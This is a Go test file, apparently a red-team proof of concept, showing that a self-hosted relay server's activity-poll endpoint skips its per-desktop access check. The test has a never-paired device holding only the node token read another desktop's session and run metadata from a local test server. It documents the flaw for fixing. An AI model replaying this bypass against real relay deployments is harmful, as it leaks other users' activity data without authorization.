// Red-team PoC: RELAY_CHANNEL=self activity-poll authorization gap.
//
// serveActivityPoll (internal/signal/activity.go:342-361) gates self-hosted
// polls ONLY on: node bearer token + fresh Ed25519 proof + devID != target.
// The per-desktop ACL at activity.go:382 (`if !h.selfHosted`) never runs in
// self mode, so ANY holder of RELAY_SELF_TOKEN — e.g. any device that ever
// received a self invite link (VR-SEC-12: invite embeds the token by default),
// including devices the desktop later un-paired — can poll the activity
// metadata (session_id, run_id, phase, ui_id, method) of EVERY desktop on the
// node, without ever being paired with that desktop.
//
// This test proves the leak end-to-end against the real Hub:
//   1. desktop goes online and publishes one activity state (real flow,
//      pairing_ticket from device.registered);
//   2. an attacker that never paired with the desktop and holds ONLY the
//      node token polls the desktop and RECEIVES the activity list.
//
// Run:  VANORA_SECURITY_STRICT=1 go test ./red_poc -run TestRedSelfActivityPollWithoutPairing -v
package red_poc

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/coder/websocket"
	"vanora-relay/internal/ice"
	"vanora-relay/internal/identity"
	"vanora-relay/internal/signal"
	"vanora-relay/protocol"
)

type redClient struct {
	ws   *websocket.Conn
	ctx  context.Context
	pub  ed25519.PublicKey
	priv ed25519.PrivateKey
	id   string
}

func mustOK(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}

// dialSelf replicates test/security's dialSelfClient: Bearer ws dial + challenge/login.
func dialSelf(t *testing.T, ctx context.Context, url, token, role string) *redClient {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	mustOK(t, err)
	devID, err := identity.SelfDeviceID(pub)
	mustOK(t, err)
	ws, _, err := websocket.Dial(ctx, url, &websocket.DialOptions{
		HTTPHeader: http.Header{"Authorization": {"Bearer " + token}},
	})
	mustOK(t, err)
	t.Cleanup(func() { _ = ws.CloseNow() })
	_, raw, err := ws.Read(ctx)
	mustOK(t, err)
	var ch protocol.Message
	mustOK(t, json.Unmarshal(raw, &ch))
	if ch.Type != "auth.challenge" {
		t.Fatalf("want auth.challenge, got %s", ch.Type)
	}
	loginMsg := protocol.Message{Type: "auth.login", Connection: ch.Connection, From: devID, To: "signal"}
	mustOK(t, loginMsg.Sign(priv, protocol.Encode(map[string]string{
		"role":       role,
		"public_key": base64.RawURLEncoding.EncodeToString(pub),
	})))
	mustOK(t, ws.Write(ctx, websocket.MessageText, protocol.Encode(loginMsg)))
	_, okRaw, err := ws.Read(ctx)
	mustOK(t, err)
	var okMsg protocol.Message
	mustOK(t, json.Unmarshal(okRaw, &okMsg))
	if okMsg.Type != "auth.ok" {
		t.Fatalf("want auth.ok, got %s %s", okMsg.Type, okMsg.Data)
	}
	return &redClient{ws: ws, ctx: ctx, pub: pub, priv: priv, id: devID}
}

func (c *redClient) send(t *testing.T, m protocol.Message) {
	t.Helper()
	mustOK(t, c.ws.Write(c.ctx, websocket.MessageText, protocol.Encode(m)))
}

func (c *redClient) readExpect(t *testing.T, expect string) protocol.Message {
	t.Helper()
	_, raw, err := c.ws.Read(c.ctx)
	mustOK(t, err)
	var m protocol.Message
	mustOK(t, json.Unmarshal(raw, &m))
	if m.Type != expect {
		t.Fatalf("want %s, got %s %s", expect, m.Type, m.Data)
	}
	return m
}

func strictEnv(t *testing.T) {
	t.Helper()
	t.Setenv("STUN_URLS", "local")
	t.Setenv("TURN_PUBLIC_IP", "127.0.0.1")
	t.Setenv("TURN_BIND_IP", "127.0.0.1")
	t.Setenv("TURN_PORT", "0")
	t.Setenv("TURN_TCP", "false")
	t.Setenv("TURN_RELAY_MIN_PORT", "0")
	t.Setenv("TURN_RELAY_MAX_PORT", "0")
	_ = os.Getenv("VANORA_SECURITY_STRICT")
}

func TestRedSelfActivityPollWithoutPairing(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	// Private node operator token, never shared with the attacker in this
	// test EXCEPT through the documented invite-link default (VR-SEC-12).
	// Here the attacker simply holds the node token, like any stale invite
	// recipient / former node member does.
	token := strings.Repeat("K", 40)
	strictEnv(t)
	iceSrv, err := ice.FromEnv()
	mustOK(t, err)
	t.Cleanup(func() { _ = iceSrv.Close() })

	h := signal.NewSelfHosted(token, iceSrv)
	go h.Run(ctx)
	srv := httptest.NewServer(h)
	defer srv.Close()
	wsURL := "ws" + strings.TrimPrefix(srv.URL, "http")

	// --- 1. Victim desktop: normal online + activity publish flow. ---
	desk := dialSelf(t, ctx, wsURL, token, "desktop")
	card := protocol.Message{Type: "device.card", From: desk.id, To: "self"}
	mustOK(t, card.Sign(desk.priv, []byte("VictimPC")))
	desk.send(t, protocol.Message{Type: "device.online", Data: protocol.Encode(map[string]any{"card": card})})
	reg := desk.readExpect(t, "device.registered")
	var regData struct {
		Ticket string `json:"pairing_ticket"`
	}
	mustOK(t, json.Unmarshal(reg.Data, &regData))
	if regData.Ticket == "" {
		t.Fatal("missing pairing_ticket")
	}

	body, _ := json.Marshal(map[string]any{
		"session_id": "sess-red",
		"run_id":     "run-red",
		"phase":      "running",
		"method":     "run.start",
		"ui_id":      "ui-red",
	})
	pubReq, _ := http.NewRequest(http.MethodPost, srv.URL+"/v1/signal?activity=1", bytes.NewReader(body))
	pubReq.Header.Set("Vanora-Desktop", desk.id)
	pubReq.Header.Set("Authorization", "Bearer "+regData.Ticket)
	pubResp, err := http.DefaultClient.Do(pubReq)
	mustOK(t, err)
	pubResp.Body.Close()
	if pubResp.StatusCode != http.StatusNoContent {
		t.Fatalf("publish status = %d, want 204", pubResp.StatusCode)
	}

	// --- 2. Attacker: brand-new device, NEVER paired with the desktop,
	//        no connect.request / pairing proof of any kind. Holds only the
	//        node token (as any stale invite-link recipient does). ---
	atkPub, atkPriv, err := ed25519.GenerateKey(rand.Reader)
	mustOK(t, err)
	atkID, err := identity.SelfDeviceID(atkPub)
	mustOK(t, err)

	proof := protocol.Message{Type: "activity.poll", From: atkID, To: desk.id}
	mustOK(t, proof.Sign(atkPriv, []byte(strconv.FormatInt(time.Now().UnixMilli(), 10))))

	pollURL := srv.URL + "/v1/signal?activity=" + desk.id
	pollReq, _ := http.NewRequest(http.MethodGet, pollURL, nil)
	pollReq.Header.Set("Authorization", "Bearer "+token)
	pollReq.Header.Set("X-Vanora-Public-Key", base64.RawURLEncoding.EncodeToString(atkPub))
	pollReq.Header.Set("X-Vanora-Activity-Proof", base64.RawURLEncoding.EncodeToString(protocol.Encode(proof)))
	pollResp, err := http.DefaultClient.Do(pollReq)
	mustOK(t, err)
	raw, err := io.ReadAll(pollResp.Body)
	mustOK(t, err)
	_ = pollResp.Body.Close()

	if pollResp.StatusCode == http.StatusForbidden {
		t.Fatalf("expected ACL to block unpaired token holder, got leak: %s", raw)
	}
	if pollResp.StatusCode != http.StatusOK {
		t.Fatalf("poll status = %d body=%s", pollResp.StatusCode, raw)
	}
	var out struct {
		DeviceID   string               `json:"device_id"`
		Activities []signal.ActivityState `json:"activities"`
	}
	mustOK(t, json.Unmarshal(raw, &out))
	leaked := false
	for _, st := range out.Activities {
		if st.SessionID == "sess-red" && st.Method == "run.start" {
			leaked = true
		}
	}
	if !leaked {
		t.Fatalf("no leaked session found, body=%s", raw)
	}

	// --- 3. Controls: the same endpoint DOES enforce bearer + signature. ---
	badTok, _ := http.NewRequest(http.MethodGet, pollURL, nil)
	badTok.Header.Set("Authorization", "Bearer wrong-token")
	p1, _ := http.DefaultClient.Do(badTok)
	p1.Body.Close()
	if p1.StatusCode != http.StatusUnauthorized {
		t.Fatalf("wrong bearer status = %d, want 401", p1.StatusCode)
	}

	badProofReq, _ := http.NewRequest(http.MethodGet, pollURL, nil)
	badProofReq.Header.Set("Authorization", "Bearer "+token)
	badProofReq.Header.Set("X-Vanora-Public-Key", base64.RawURLEncoding.EncodeToString(atkPub))
	badProofReq.Header.Set("X-Vanora-Activity-Proof", base64.RawURLEncoding.EncodeToString([]byte("{}")))
	p2, _ := http.DefaultClient.Do(badProofReq)
	p2.Body.Close()
	if p2.StatusCode != http.StatusUnauthorized {
		t.Fatalf("bad proof status = %d, want 401", p2.StatusCode)
	}

	t.Fatalf("RED TEAM WIN (self-mode activity leak): attacker %s never paired with desktop %s, "+
		"holds only node token; poll returned %d activities of the desktop: %s",
		atkID, desk.id, len(out.Activities), raw)
}


